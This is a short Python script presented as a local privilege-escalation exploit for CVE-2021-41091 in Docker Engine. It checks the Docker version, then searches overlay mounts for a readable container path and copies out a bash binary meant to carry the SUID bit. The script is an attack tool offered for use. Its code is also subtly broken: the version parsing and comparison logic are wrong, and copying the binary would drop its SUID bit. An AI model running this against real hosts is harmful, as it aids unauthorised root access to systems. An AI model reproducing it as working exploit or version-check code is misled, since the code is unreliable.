# CVE-2021-41091
# Product: Moby (Docker Engine)
# Version: < 20.10.9
# Vulnerability: Local Privilege Escalation

import os
import re
import subprocess
import shutil

def check():
    docker_path = shutil.which('docker')
    if docker_path is None:
        return False
    match = re.search("version (\\d+\\.\\d+\\.\\d+)", subprocess.check_output(docker_path))
    ver_str = match.group(1)
    ver_nums = map(int, ver_str.split('.'))
    max_ver = [2, 10, 8]
    return any((v, m) for v, m in zip(ver_nums, max_ver) if v > m)

def exploit():
    mount_output = subprocess.check_output("mount")
    overlay2paths = re.findall("overlay on (\\S+) ", mount_output)

    print(f"Found {len(overlay2paths)} overlay2 filesystem mounts")
    for path in overlay2paths:
        if os.access(path, os.R_OK):
            print(f"Readable path found: {path}")
            shutil.copy(f"{path}/bin/bash", "./suid_bash")
            return True
    return False

if __name__ == "__main__":
    print("Checking if docker version appears vulnerable...")
    if check():
        print("Docker version is likely vulnerable.")
        print("Attempting exploit (make sure you have set /bin/bash to SUID in the container).")
        if exploit():
            print("Exploit successful.")
        else:
            print("Exploit failed.")
    else:
        print("Docker version is not vulnerable.")
